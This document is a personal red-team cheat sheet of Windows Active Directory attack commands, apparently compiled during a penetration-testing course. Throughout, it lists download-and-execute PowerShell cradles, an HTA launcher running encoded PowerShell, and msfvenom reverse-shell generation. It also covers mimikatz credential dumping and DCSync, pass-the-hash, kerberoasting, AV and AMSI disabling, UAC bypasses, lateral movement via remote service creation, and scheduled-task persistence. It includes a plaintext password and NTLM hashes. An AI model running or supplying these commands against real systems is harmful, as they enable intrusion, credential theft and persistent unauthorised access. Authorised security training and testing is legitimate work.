	xfreerdp /drive:share,/tmp /clipboard /v:10.X.100.205 /port:3389 /u:localadmin /p:ATRTOPassword! /size:1600x1000

Password spray: https://gist.githubusercontent.com/ropnop/c53bb27678b68435c5537057c585736c/raw/25f11866d981d0c6667d3c59ece2817ff5663fb8/kinit_user_brute.sh
	./kinit_user_brute.sh YPL controller username_list password

iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"

python /usr/share/unicorn-magic/unicorn.py /tmp/test.ps1 (https://www.r00tpgp.com/2019/08/post-exploitation-sep-av-bypass-for.html)

-------------------------------------------------------------------
Lauchers:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe \\10.12.2.129\test\launcher.xml'  (https://github.com/giMini/PowerMemory/blob/master/RWMC/misc/reverseshell.xml)
	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w hidden –enc JABnAD0A"
	powershell "IEX(New-Object Net.WebClient).downloadString('http://172.16.70.10/Invoke-PEInjectionInMemory.ps1'); [Bypass.AMSI]::Disable()
		IEX(New-Object Net.WebClient).downloadString('http://10.12.2.132/Get-System.ps1'); Get-System -Technique Token
	$WC=NeW-OBJecT SyStem.NET.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAders.ADd('User-Agent',$u);$Wc.ProxY = [SYsTem.NET.WEBREQUesT]::DEFAuLtWebPRoxy;$WC.PROxY.CrEdentIalS = [SYSteM.Net.CreDentialCACHe]::DEFAulTNETWOrkCrEdEnTialS;$Wc.DownLoADSTriNG('http://10.1.1.132/powershell.ps1') | IEX

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.12.2.132 LPORT=443 -f c -o msf.txt
cat msf.txt|grep -v unsigned|sed "s/\"\\\x//g"|sed "s/\\\x//g"|sed "s/\"//g"|sed ':a;N;$!ba;s/\n//g'|sed "s/;//g"   (https://pentestmag.com/simpleshellcodeinjector-ssi/)
powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.12.2.132/ssi.exe', 'C:\Users\Public\Downloads\ssi.exe'); C:\Users\Public\Downloads\ssi.exe fc4883e4"

HTA:
<script language="VBScript">
    Function var_func()
        Dim var_shell
        Set var_shell = CreateObject("Wscript.Shell")
        var_shell.run "powershell.exe -nop -w 1 -enc aQBlAHgAIAAoACgA=", 0, true
    End Function

    var_func
    self.close
</script>

	mshta http://192.168.214.129/delivery.hta

-------------------------------------------------------------
Internal Recon from Kali:

IP to host:
	nmap -sL <target or range>
Search shares:
	smbclient -U "Domain\username%password" -L hostname

use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/snmp/snmp_login
snmpcheck.pl -c community_string -t i

Null sessions:
	rpcclient -U username IPAddress  or rpcclient –U "" IPAddress

Enum shares:
	smbclient -U "Domain\username%password" -L hostname

-------------------------------------------------------------
Recon from domain joined machines:

Linux:
	Nmblookup -A <IP>   or  nbtscan –r <range>
	dig –t NS domain_name or dig _gc. domain_name
	https://github.com/the-useless-one/pywerview
	(b2 p30) cat ips.txt | while read line > do > echo $line && rpcclient -U "ELS\SamanthaRivers%P@ssw0rd123" -c "enumdomusers;quit" $line > done
Windows:
	Nbtstat -a <IP>  --  tasklist /v  --  sysinfo
	wmic qfe list brief - Installed updates
	Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt
	whoami & hostname & ipconfig /all & net user /domain 2>&1 & net group /domain 2>&1 & net group "domain admins" /domain 2>&1 & net group "Exchange Trusted Subsystem" /domain 2>&1 & net accounts /domain 2>&1 & net user 2>&1 & net localgroup administrators 2>&1 & netstat -an 2>&1 & tasklist 2>&1 & sc query 2>&1 & systeminfo 2>&1 & reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>&1

	Get DC:
		nslookup -querytype=SRV _LDAP._TCP.DC._MSDCS.domain_name -- nltest /server:ip_of_any_member /dclist:domain_name -- net view /domain  or net view /domain:domain_name
		[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
	Resolve IPs:
		for /L %i in (1,1,255) do @nslookup 10.12.2.%i 10.12.2.50 2>nul | find "Name" && echo 10.12.2.%i
		for /L %i in (1,1,255) do @nbtstat -A 10.10.10.%i 2>nul && echo 10.10.10.%i
	Get admins on remote host:
		([ADSI]'WinNT://computer_name/Administrators').psbase.Invoke('Members') | %{$_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null)}
		Get-NetLocalGroup -ComputerName computer_name -Recurse
	Shares / Mounted drives:
		powershell -Command 'get-WmiObject -class Win32_Share'
		powershell -Command 'get-PSDrive'
		powershell -Command 'Get-WmiObject -Class Win32_MappedLogicalDisk | select Name, ProviderName”
	Search files locally:   
		Get-Childitem -Include *Executable* -Recurse 
		Get-Process Executable -FileVersionInfo
		Dir Executable.exe /s
		dir /s *password*
		dir /S /B c:\ | findstr "somefile"
		findstr /s /n /i /p foo *
		findstr /si pass *.txt | *.xml | *.ini
		wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE
	AV installed: wmic /namespace:\\root\securitycenter2 path antivirusproduct

	AD discovery checks:    powershell -NoP -NonI -Exec Bypass -Command "& { . \\140.4.126.128\share\ADAPE.ps1}"

	WSUS config:
		reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
		reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer   (0x1 means used)
	WPAD check: reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections" (if DefaultConnectionSettings 5 bit even, WPAD attack possible)

	• accesschk.exe/accesschk64.exe - privilege escalation • psexec.exe/PsExec64.exe - lateral movement • ADExplorer.exe - can export with -snapshot <DC> <local file> • procdump.exe/procdump64.exe - dump process memory
	
	Transfer files: bitsadmin /transfer test2 http://172.16.70.10/test2.xlsm C:\Users\ELS_Admin\Downloads\test2.xlsm

Load AD tools (https://github.com/samratashok/ADModule):
	(New-Object System.Net.WebClient).DownloadFile('http://10.12.2.132/Microsoft.ActiveDirectory.Management.dll', 'C:\Temp\Microsoft.ActiveDirectory.Management.dll')
	Import-Module C:\Temp\Microsoft.ActiveDirectory.Management.dll -Verbose
With AD tools: get-addomain
	Get-ADUser -filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
	Get-ADUser -Filter * -Properties * | Select name,Description
	Get-ADUser -Filter 'Description -like "build*"' -Properties Description | select name,Description

	Get-ADComputer –filter * -Properties ipv4address | where {$_.IPV4address} | select name,ipv4address 
	get-adcomputer -filter {ipv4address -eq 'IP'} -Properties Lastlogondate,passwordlastset,ipv4address
	Get-ADComputer -filter {ServicePrincipalName -Like "*SPN*"} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastL ogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation
	Get-ADComputer -filter {TrustedForDelegation -eq $True}
	Get-ADComputer -Filter 'OperatingSystem -like "*Windows*"' -Properties OperatingSystem | select name,OperatingSystem
	Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select name,OperatingSystem
	Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
	Get-ADComputer -filter {PrimaryGroupID -eq "515"} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation

	Get-ADPrincipalGroupMembership -Identity student1
	Get-ADGroup -Filter * | select Name
	Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
	Get-ADGroup -Filter * -Properties *
	Get-ADGroupMember -Identity "Domain Admins" -Recursive

	List OUs:
		Get-ADObject -Filter {ObjectClass -eq 'organizationalunit'} -Properties CanonicalName | Select -Object DistinguishedName
	Get OU members:
		$oupath = "OU=Bastion-Host,DC=mgmt,DC=corp"
		Get-ADUser -Filter * -SearchBase $oupath 

	Get-ADForest | select -ExpandProperty GlobalCatalogs
	Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
	
Didn't work for me:
	Get-UserProperty -Properties pwdlastset
	Get-GPO -All
	Get-GPResultantSetOfPolicy -ReportType Html -Path c:\temp\gpo.html

Disable AV: Set-MpPreference -DisableRealtimeMonitoring $True -Force

PowerView (alternative - https://github.com/fdiskyou/hunter):
	powershell "IEX(New-Object Net.WebClient).downloadString('http://10.12.2.132/PowerView.ps1'); 
	Privesc:
		Get-GPPPassword
		Invoke-ShareFinder -Verbose
		Invoke-FileFinder -Verbose
		Get-NetFileServer

		Find-LocalAdminAccess -Verbose (also via Find-WMILocalAdminAccess.ps1)
	Users:
		Find-UserField -SearchField Description -SearchTerm
		Get-NetUser -AllowDelegation -AdminCount
		Get-NetUser –AdminCount | select name,whencreated,pwdlastset,lastlogon
		Get-NetUser -Username student1
		Get-NetUser | select samaccountname,description,memberof
		Get-DomainUser -PreauthNotRequired -Verbose
		Get-DomainUser -TrustedToAuth	-	Rubeus.exe s4u /user:svc-omada /rc4:65F91B600E51F19A80593D0A62047CC5 /impersonateuser:"developer1" /msdsspn:"HOST/Dev01.els.bank" /altservice:http /ptt
		Invoke-UserHunter -Stealth -ShowAll
		Invoke-UserHunter -GroupName "RDPUsers"

		Get-NetLoggedon -ComputerName laptop49 (need admin on the box)
		Get-LastLoggedOn -ComputerName laptop49
		Get-LoggedonLocal -ComputerName laptop49 (need remote registry enabled)
	Groups:
		Get-NetGroupMember 'Domain Admins' -Recurse
		Get-NetGroupMember –GroupName "Domain Admins"
		Get-NetGroupMember -GroupName "Local Admin"
		Get-NetGroupMember –GroupName "Denied RODC Password Replication Group" -Recurse
		Get-NetGroup "*admins*" | Get-NetGroupMember –Recurse | ?{$_.MemberName –Like '*.*'}
		Get-NetGroup "*Hyper*" | Get-NetGroupMember
		Get-NetGroup "*VMWare*" | Get-NetGroupMember

		Get-NetLocalGroup -ComputerName computer_name -ListGroups
		Get-NetLocalGroup -ComputerName computer_name -GroupName "Remote Desktop Users" -Recurse
		Get-NetDomainController | Get-NetLocalGroup -Recurse
	Computers:
		Get-DomainComputer -Unconstrained  -- Get-NetComputer -Unconstrained
		Get-NetComputer | Select distinguishedname,description,useraccountcontrol
		Get-NetComputer -FullData
		Get-NetComputer -OperatingSystem "*Server 2016*"
		Get-NetComputer -SPN mssql*
	GPO:
		Get-DomainOU -GPLink '<GPO_GUID_NAME>' | % {GetDomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
		Get-DomainGPOLocalGroup - will enumerate all GPOs that modify local group memberships through GPO 
		Get-NetGPOGroup
		Get-NetGPO | select displayname, distinguishedname
		Get-NetGPO | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -Name $_.name} | Where-Object {$_.ActiveDirectoryRights -match 'WriteProperty'}
		Find-GPOLocation -UserName username -LocalGroup RDP
		Find-GPOComputerAdmin -ComputerName computer_name
	ACL:
		Get-ObjectACL -DistinguishedName "dc=els,dc=local" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }
		Add-ObjectACL -TargetDistinguishedName "dc=els,dc=local" -PrincipalSamAccountName SamAccountName1 -Rights DCSync
		Invoke-ACLScanner –ResolveGUIDs –ADSpath 'OU=X,OU=Y,DC=Z,DC=W' | Where {$_.ActiveDirectoryRights -eq 'GenericAll'}
	Forest:
		Get-NetForest -- Get-NetDomain  Get-NetForestDomain -- Get-NetForestDomain
		Named services across the forest trust: Get-NetDomainTrust | ?{$_.TrustName -ne 'External'} | %{Get-NetUser -SPN -Domain $_.TargetName}

Get the user with read on LAPS - b2 p 173
https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
https://github.com/Arvanaghi/SessionGopher

https://tylersguides.com/guides/search-active-directory-ldapsearch/
	ldapsearch -H ldap://ypl.local -x -W -D "amy@ypl.local" -b "dc=ypl,dc=local" "(sAMAccountName=bob)"
	ldapsearch -H ldap://ypl.local -x -W -D "amy@ypl.local" -b "OU=Frankfurt,OU=Europe,dc=ypl,dc=local" "(sAMAccountName=*)"
	ldapsearch -H ldap://ypl.local -x -W -D "amy@ypl.local" -b "dc=ypl,dc=local" "(sAMAccountName=*)" | grep "cn:" -A 3
Impacket
	GetADUsers.py -all <domain\User> -dc-ip <DC_IP>
	impacket-GetUserSPNs -request -dc-ip 10.12.2.50 ypl.local/bob
	impacket-secretsdump ypl/bob@10.12.2.52
	python /opt/impacket/examples/psexec.py <domain/user>:<password>@<server ip>
	crackmapexec <IP> -u ‘<domain\username>’ -p ‘<password>’ --local-auth --shares
Mimikatz:
	lsadump::dcsync /domain:ypl.local /all /csv
	lsadump::dcsync /user:els\krbtgt
	sekurlsa::krbtgt
	.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" "vault::cred" exit
	sekurlsa::tickets /export  -- kerberos::ptt file_name
Pass the hash:
	sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
	mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"
	Enter-PSSession -Computer <Target>
	New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
Overpass the hash:
	sekurlsa::ekeys
	Command sekurlsa::pth /user:2ndAdmin /domain:els.local /aes256:b3ed8ba2447b1f0e06d2ab072a4afd4a3f76fc4adb23a0f5c2827655c72de9fb /ntlm:49623ccc820122ab49b3f0f571b77186 /aes128:12345678901234567890123456789012 /run:notepad.exe
	steal_token 3536
	shell dir \\lab-dc01.els.local\C$
Seatbelt
	PowerShell
	DotNet
	-group=user
	Processes - non-Microsoft processes
	Services - non-Microsoft services
	TcpConnections - TCP connections
	UdpConnections - Listening UDP sockets

Empire Modules:
	psinject http 3344
	usemodule privesc/powerup/allchecks
	credentials/invoke_kerberoast --- ./john --format=krb5tgs path_to_ticket path_to_wordlist (https://github.com/magnumripper/JohnTheRipper)
	situational_awareness/network/powerview/find_localadmin_access
	credentials/mimikatz/command
	persistance/elevate/registry
	lateral_movement/invoke_psremoting

Bloodhound:
	powershell -NoP -NonI -Exec Bypass -Command "& { . C:\Temp\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -SearchForest" }"
	powershell -NoP -NonI -Exec Bypass -Command "& { . C:\Temp\SharpHound.ps1; Invoke-BloodHound -CollectionMethod SessionLoop" }"
	sharphound.exe -c all -- sharphound.exe -c sessionloop

Movement:
	copy rev6666.exe \\10.12.2.52\c$\temp\
	sc.exe \\10.12.2.52 create zExampleService binpath="c:\temp\rev6666.exe"
	sc.exe \\10.12.2.52 start zExampleService

	$COM = [activator]::CreateInstance([type]::GetTypeFromProgID(" MMC20.APPLICATION", "10.12.2.52"))
	$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $Null, $Null, "7"

	Invoke-Command -ComputerName laptop12.ypl.local -ScriptBlock {whoami} --- -FilePath C:\Path\To\Local\file.ps1
	Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:ypl.local /ntlm:<ntlmhash> /run:powershell.exe"'

Login from Kali with password:
	kinit 2ndAdmin@ELS.LOCAL
	KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py -k -no-pass els.local/2ndAdmin@user8.els.local

Overpass the hash from Kali:
	ktutil -k ~/mykeys add -p 2ndAdmin@ELS.LOCAL -e arcfour-hmac-md5 -w 49623ccc820122ab49b3f0f571b77186 --hex -V 5
	kinit -t ~/mykeys 2ndAdmin@ELS.LOCAL
	KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py -k -no-pass els.local/2ndAdmin@user8.els.local

Privesc/UAC Bypass:
	akagi64.exe 49 "c:\users\public\shell.exe"
	CVE-2019-1388 https://packetstormsecurity.com/files/14437/hhupd.exe.html
	exploit/windows/local/bypassuac_eventvwr
	Fodhelper UAC bypass + persistence for admins:
		REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
	  REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "powershell -nop -w hidden -EncodedCommand SQBFAFgAI" /f
		echo c:\windows\system32\fodhelper.exe > c:\windows\tasks\fodhelper.bat
		SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Fodhelper update" /TR "c:\windows\tasks\fodhelper.bat" /ST 12:50

Kerberoasting:
	auxiliary/gather/get_user_spns  -- or -- impacket-GetUserSPNs -request -dc-ip 10.12.2.50 ypl.local/bob
	hashcat64 -m 13100 -a 0 spns.txt rockyou.txt --force

	Add-Type -AssemblyName System.IdentityModel
	New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "jboss/ypl.local"  -- Request-SPNTicket (from PowerView)
	Invoke-Mimikatz -Command '"kerberos::list /export"' -- python tgsrepcrack.py ..

ASREP Roasting:
	Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth  --  Get-DomainUser -PreAuthNotRequired -Verbose (PowerView)
	IEX(New-Object Net.WebClient).downloadString('http://10.12.2.132/ASEPRoast.ps1'); Invoke-ASREPRoast -Verbose -- Get-ASREPHash -UserName bob -Verbose
	Powerview:
		Search for RDP Users: Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
		Disable preauth: Set-DomainObject -Identity student1 -XOR @{useraccountcontrol=4194304} -Verbose
		Request ticket: Get-ASREPHash -UserName student1 -Verbose
Persist:
	SharPersist -t schtask -c "powershell.exe" -a "-nop -w 1 -enc JABjAGwA=" -n "WinUpdate" -m add -o hourly
	SharPersist -t schtaskbackdoor -m list -n "Something Cool"
--------------------------------------
Dump browser data: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
Kerberos proxy: https://github.com/mikkolehtisalo/gssapi-proxy (requires system priv)
